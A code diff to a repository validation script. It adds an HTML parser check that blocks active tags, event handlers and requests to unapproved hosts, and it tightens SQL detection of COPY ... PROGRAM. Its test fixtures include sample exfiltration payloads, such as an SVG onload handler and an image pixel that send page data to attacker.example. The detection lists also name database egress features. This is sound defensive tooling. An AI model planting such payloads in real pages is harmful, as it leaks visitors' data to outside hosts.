@@ -1,5 +1,6 @@
 import { readFile, readdir } from "node:fs/promises";
 import { createHash } from "node:crypto";
+import { parse } from "parse5";
 
 const requiredDocs = {
   "README.md": [
@@ -570,6 +571,42 @@ function hasSqlFalseGucSetting(content) {
   }));
 }
 
+function hasUnapprovedHtmlEgress(content, approvedHosts) {
+  const activeTags = new Set(["script", "form", "iframe", "frame", "audio", "video", "source", "track", "object", "embed", "base", "style"]);
+  const urlAttributes = new Set(["src", "href", "xlink:href", "action", "formaction", "poster", "data", "cite", "background"]);
+  const isApprovedResource = (value) => {
+    const candidate = value.trim();
+    if (!candidate) return true;
+    if (/^(?:#|\/(?!\/)|\.\.?\/)/.test(candidate)) return true;
+    if (/^data:image\//i.test(candidate)) return true;
+    try {
+      const url = new URL(candidate);
+      return url.protocol === "https:" && approvedHosts.has(url.hostname.toLowerCase());
+    } catch {
+      return false;
+    }
+  };
+  const resourceListIsApproved = (value) => value.split(",").every((entry) => isApprovedResource(entry.trim().split(/\s+/)[0] ?? ""));
+  let rejected = false;
+  const visit = (node) => {
+    if (rejected) return;
+    const tagName = String(node.tagName ?? "").toLowerCase();
+    const attributes = node.attrs ?? [];
+    if (activeTags.has(tagName)) rejected = true;
+    if (tagName === "meta" && attributes.some((attribute) => attribute.name.toLowerCase() === "http-equiv" && attribute.value.toLowerCase() === "refresh")) rejected = true;
+    for (const attribute of attributes) {
+      const name = attribute.name.toLowerCase();
+      if (name.startsWith("on")) rejected = true;
+      if (name === "style" && /(?:url\s*\(|@import)/i.test(attribute.value)) rejected = true;
+      if (urlAttributes.has(name) && !isApprovedResource(attribute.value)) rejected = true;
+      if (name === "srcset" && !resourceListIsApproved(attribute.value)) rejected = true;
+    }
+    for (const child of node.childNodes ?? []) visit(child);
+  };
+  visit(parse(content));
+  return rejected;
+}
+
 function hasAiRuntimeBoundary(content, path = "") {
   const normalizedPath = path.toLowerCase();
   let normalizedContent = content
@@ -588,6 +625,7 @@ function hasAiRuntimeBoundary(content, path = "") {
     ? sqlLexicalContent.replace(/"([a-z_][a-z0-9_$]*)"/gi, "$1")
     : normalizedContent;
   const sqlTokens = normalizedPath.endsWith(".sql") ? sqlIdentifierTokens(sqlLexicalContent) : [];
+  const sqlStructure = normalizedPath.endsWith(".sql") ? sqlStructuralTokens(sqlLexicalContent) : [];
   const hasDynamicSqlExecute = sqlTokens.some((token, index) => token === "execute"
     && !["grant", "revoke"].includes(sqlTokens[index - 1])
     && !["function", "procedure"].includes(sqlTokens[index + 1]));
@@ -603,18 +641,29 @@ function hasAiRuntimeBoundary(content, path = "") {
     sqlTokens.some((token) => ["pg_cron", "quoted:pg_cron"].includes(token))
     || sqlTokens.some((token) => ["cron", "quoted:cron"].includes(token))
     || sqlTokens.some((token) => ["schedule", "quoted:schedule", "schedule_in_database", "quoted:schedule_in_database", "unschedule", "quoted:unschedule", "alter_job", "quoted:alter_job"].includes(token))
-    || sqlStructuralTokens(sqlLexicalContent).some((token) => token.type === "string" && token.value.toLowerCase() === "cron")
+    || sqlStructure.some((token) => token.type === "string" && token.value.toLowerCase() === "cron")
   );
   const hasExternalDatabaseCapability = normalizedPath.endsWith(".sql") && (
     sqlTokens.some((token) => {
       const identifier = token.replace(/^quoted:/, "");
       return identifier.startsWith("dblink") || identifier.startsWith("postgres_fdw");
     })
-    || sqlStructuralTokens(sqlLexicalContent).some((token) => token.type === "string"
+    || sqlStructure.some((token) => token.type === "string"
       && /(?:dblink|postgres_fdw)/i.test(token.value))
   );
-  const hasSqlServerProgramCapability = normalizedPath.endsWith(".sql")
-    && sqlTokens.some((token, index) => token === "copy" && sqlTokens.slice(index + 1).includes("program"));
+  const sqlStatements = [];
+  let sqlStatement = [];
+  for (const token of sqlStructure) {
+    if (token.type === "symbol" && token.value === ";") {
+      sqlStatements.push(sqlStatement);
+      sqlStatement = [];
+    } else sqlStatement.push(token);
+  }
+  if (sqlStatement.length > 0) sqlStatements.push(sqlStatement);
+  const hasSqlServerProgramCapability = sqlStatements.some((statement) => {
+    const identifiers = statement.filter((token) => token.type === "identifier").map((token) => token.value.replace(/^quoted:/, ""));
+    return identifiers[0] === "copy" && identifiers.includes("program");
+  });
   const hasAdjacentSqlStrings = normalizedPath.endsWith(".sql") && /(?:^|[\s(])(?:E|U&)?'(?:[^']|'')*'\s*(?:\r?\n|\r)[ \t]*(?:E|U&)?'/im.test(sqlLexicalContent);
   const approvedEgressHosts = new Set([
     "api.github.com",
@@ -689,10 +738,8 @@ function hasAiRuntimeBoundary(content, path = "") {
   const hasDynamicCapabilityLookup = /\b(?:globalThis|Reflect|eval|Function)\b|\b(?:self|window)\s*\[/.test(normalizedContent);
   const domSinkRemainder = normalizedContent.replace(/\bnew\s+URL\s*\(/g, "(");
   const domSinkPinnedFiles = new Set(["apps/worker/src/app-assets.ts", "apps/worker/src/index.ts"]);
-  const hasUnapprovedHtmlActiveContent = normalizedPath.endsWith(".html") && (
-    /<\s*(?:script|form|iframe|frame|audio|video|source|track|object|embed|base)\b/i.test(domSinkRemainder)
-    || /<\s*meta\b[^>]*http-equiv\s*=\s*["']?refresh\b/i.test(domSinkRemainder)
-  );
+  const hasUnapprovedHtmlActiveContent = normalizedPath.endsWith(".html")
+    && hasUnapprovedHtmlEgress(normalizedContent, approvedEgressHosts);
   const hasUnapprovedDomSink = !domSinkPinnedFiles.has(path)
     && !path.endsWith(".html")
     && (/\b(?:document|DOMParser|Image|location|open)\b|\.(?:submit|requestSubmit)\s*\(|\btext\/html\b/i.test(domSinkRemainder)
@@ -834,6 +881,8 @@ for (const fixture of [
   { content: 'fetch(`${config.url}${path}`); fetch(`${config.url}${path}`);', path: "apps/worker/src/index.ts" },
   { content: 'const phase1Worker = env.AI_PROXY; return phase1Worker.fetch(request);', path: "apps/worker/src/provider.ts" },
   { content: '<script>new Image().src = new URLSearchParams(location.search).get("u")</script>', path: "apps/brand-site/public/dynamic-egress.html" },
+  { content: '<svg onload="location=\'//attacker.example/\'+location.search"></svg>', path: "apps/brand-site/public/svg-event-egress.html" },
+  { content: '<img src="//attacker.example/pixel">', path: "apps/brand-site/public/protocol-relative-egress.html" },
   { content: "select create_ai_adapter();", path: "supabase/migrations/ai-adapter.sql" }
 ]) {
   if (!hasAiRuntimeBoundary(fixture.content, fixture.path)) {
@@ -846,7 +895,8 @@ for (const fixture of [
   { content: "select 'ordinary literal';", path: "supabase/migrations/99999999999999-safe-literal.sql" },
   { content: "perform set_config('app.manual_publish_context', 'on', true);", path: "supabase/migrations/99999999999999-approved-transaction-context.sql" },
   { content: "set standard_conforming_strings = on;", path: "supabase/migrations/99999999999999-safe-standard-strings.sql" },
-  { content: "do $$ begin set standard_conforming_strings = on; end $$;", path: "supabase/migrations/99999999999999-safe-do-standard-strings.sql" }
+  { content: "do $$ begin set standard_conforming_strings = on; end $$;", path: "supabase/migrations/99999999999999-safe-do-standard-strings.sql" },
+  { content: "copy safe_table to stdout; select program from allowed_table;", path: "supabase/migrations/99999999999999-safe-copy-stdout.sql" }
 ]) {
   if (hasAiRuntimeBoundary(fixture.content, fixture.path)) {
     errors.push(`AI absence safe SQL fixture was rejected: ${fixture.path}`);
